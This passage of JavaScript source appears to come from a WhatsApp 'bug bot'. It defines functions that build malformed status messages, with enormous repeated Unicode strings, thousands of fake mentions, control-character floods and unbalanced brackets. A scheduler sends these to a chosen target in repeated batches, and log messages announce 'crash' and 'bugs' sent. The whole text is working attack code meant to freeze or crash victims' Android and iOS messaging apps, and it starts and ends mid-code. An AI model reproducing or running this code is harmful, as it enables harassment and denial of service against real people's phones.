                { tag: "to", attrs: { jid: X }, content: undefined }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error("[bug error]", err);
  }
}

async function NewBoeg(X) {

const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }
  
    let Sugandih = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(10000),
    title: "kopi dangdut",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };


  let tmsg = await generateWAMessageFromContent(X, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: Math.floor(Math.random() * 99999),
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        quotedMessage: {
           imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
               mimetype: "image/jpeg",
               caption:"ោ៝".repeat(6000),
               fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
               fileLength: "19769",
               height: 354,
               width: 783,
               mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
               fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
               directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
               mediaKeyTimestamp: "1743225419",
               jpegThumbnail: null,
                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                scanLengths: [2437, 17332],
                 contextInfo: {
                    isSampled: true,
                    participant: X,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9999,
                    isForwarded: true
                }
            }         
        },
        annotations: [
          {
            embeddedContent: { Sugandih },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  const msg = generateWAMessageFromContent(X, message, {});
  const msgg = generateWAMessageFromContent(X, tmsg, {});

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 
  await Ren.relayMessage("status@broadcast", msgg.message, {
    messageId: msgg.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function boegProtocol(X) {
  try {
    let parse = false;
    let type = `image/webp`;

    if (11 > 9) {
      parse = parse ? false : true;
    }

    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000".repeat(5000) + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      contextInfo: {
        participant: X,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
        ],
      },
    };

    let stickerMessage = {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
      fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
      mimetype: type,
      directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
      fileLength: {
        low: Math.floor(Math.random() * 1000),
        high: 0,
        unsigned: true,
      },
      mediaKeyTimestamp: {
        low: Math.floor(Math.random() * 1700000000),
        high: 0,
        unsigned: false,
      },
      firstFrameLength: 19904,
      firstFrameSidecar: "KN4kQ5pyABRAgA==",
      isAnimated: true,
      contextInfo: {
        participant: X,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`)
        ],
        groupMentions: [],
        entryPointConversionSource: "non_contact",
        entryPointConversionApp: "whatsapp",
        entryPointConversionDelaySeconds: 467593,
      },
      stickerSentTs: {
        low: Math.floor(Math.random() * -20000000),
        high: 555,
        unsigned: parse,
      },
      isAvatar: parse,
      isAiSticker: parse,
      isLottie: parse,
    };

    const msg1 = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { locationMessage }
      }
    }, {});

    const msg2 = generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: { stickerMessage }
      }
    }, {});

    for (const msg of [msg1, msg2]) {
      await Ren.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [X],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: X },
                    content: undefined,
                  },
                ],
              },
            ],
          },
        ],
      });
      console.log(chalk.red(`Success Sent New Bulldozer to ${X}`));
    }

  } catch (err) {
    console.log("Error:", err);
  }
}
// Version 2
async function CorosuelInvis77(X, mention = true) {
  const videoServer = await prepareWAMessageMedia({
    video: {
      url: "https://files.catbox.moe/h3hf0r.mp4"
    }
  }, {
    upload: Ren.waUploadToServer
  });

  const cards = [];
  for (let i = 0; i < 10; i++) {
    cards.push({
      header: {
        ...videoServer,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "[".repeat(10000)
      }
    });
  }

  const etc = await generateWAMessageFromContent(X, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: `( 🍷HCS ) #Explanation`
          },
          carouselMessage: {
            cards
          },
          contextInfo: {
            mentionedJid: [X]
          }
        }
      }
    }
  }), {
    userJid: X,
    quoted: null
  });

  await Ren.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [X],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: X },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      X,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: etc.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
            content: undefined
          }
        ]
      }
    );
  }
  console.log(chalk.green('─────「 ⏤CrashSqlStatus Crashv4 」─────'));
}

async function restart(target, mention = true) {
  const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
    ephemeralMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 3,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 99999999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "\u0007".repeat(30000),
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
            buttons: [],
          }
        }
      }
    }
  }), { userJid: target });

  await Ren.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await Ren.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "𝐖𝐞𝐅𝐨𝐫𝐑𝐞̈𝐧𝐧̃ #🇧🇷" },
            content: undefined
          }
        ]
      }
    );
  }
  console.log(chalk.red('─────「 ! ⏤Tredict iNV⏤ ! 」─────'));
}

async function TrashLocIOS(X) {
        	try {
        		const locationMessage = {
        			degreesLatitude: -9.09999262999,
        			degreesLongitude: 199.99963118999,
        			jpegThumbnail: null,
        			name: "🩸⃟⃨〫⃰‣ ⁖—𝑺𝒏𝒊𝒕𝒉ཀ͜͡ 𝐌͢Θ𝐃𝐃͢Σ𝐑𝐒 ‣—" + "𖣂".repeat(15000),
        			address: "🇧🇷⃟༑⌁⃰𝑸𝒖𝒊 𝒆́𝒔 𝑺𝒏𝒊𝒕𝒉ཀ͜͡🇧🇷" + "𖣂".repeat(5000),
        			url: `https://www.xnxx.${"𖣂".repeat(25000)}.com`,
        		}
        		
        		const msg = generateWAMessageFromContent(X, {
                    viewOnceMessage: {
                        message: { locationMessage }
                    }
                }, {});
        		
        		await Ren.relayMessage('status@broadcast', msg.message, {
        			messageId: msg.key.id,
        			statusJidList: [X],
        			additionalNodes: [{
        				tag: 'meta',
        				attrs: {},
        				content: [{
        					tag: 'mentioned_users',
        					attrs: {},
        					content: [{
        						tag: 'to',
        						attrs: { jid: X },
        						content: undefined
        					}]
        				}]
        			}]
        		});
        	} catch (err) {
        		console.error(err);
        	}
        };

async function XiosVirus(X) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "𝑺𝒏𝒊𝒕𝒉" + "𖣂".repeat(15000),
         address: "🍻⃟༑⌁⃰𝒆́𝑺𝒏𝒊𝒕𝒉 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧ཀ͜͡🍻" + "𖣂".repeat(5000),
         url: `https://api-snith-stx.${"𖣂".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: {
            text: "𝒆́𝒔",
            matchedText: "https://t.me/stxpos",
            description: "ios turbo - 1080".repeat(15000),
            title: "—𝒆́𝒔 𝑺𝒏𝒊𝒕𝒉.".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(X, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await Ren.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await Ren.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [X],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: X
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};


async function delayNew(X, mention = true ) {
try {
    let sxo = await generateWAMessageFromContent(X, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "‼️⃟가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐.",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
   let sXoMessage = {
     extendedTextMessage: {
       text: "ꦾ".repeat(300000),
         contextInfo: {
           participant: X,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1900 },
                   () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         };

     const xso = generateWAMessageFromContent(X, sXoMessage, {});
      await Ren.relayMessage("status@broadcast", xso.message, {
        messageId: xso.key.id,
        statusJidList: [X],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: X }, content: undefined }
                ]
            }]
        }]
    });
     if (mention) {
        await Ren.relayMessage(X, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: xso.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
    await Ren.relayMessage("status@broadcast", sxo.message, {
        messageId: sxo.key.id,
        statusJidList: [X],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: X }, content: undefined }
                ]
            }]
        }]
    });
    if (mention) {
        await Ren.relayMessage(X, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: sxo.key.id,
                        type: 25,
                    },
                },
            },
        }, {});
    }
} catch (error) {
  console.error("Error di :", error, "Bodooo");
 }
}


async function DelayAndro(durationHours, X) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✅ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
          delayNew(X),
          XiosVirus(X),
          TrashLocIOS(X),
          restart(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 ANDRO DELAY 📟
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 900);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Necro 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5 * 60 * 1000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// -------------------( IOS FUNC )------------------------------ \\
const IosCrashByRXHL = async (X) => {
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "RxhlOfc" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/rxhlvro - _ #",
        matchedText: "https://t.me/rxhlvro",
        description: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        title: "鈥硷笍RXHLOFC鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ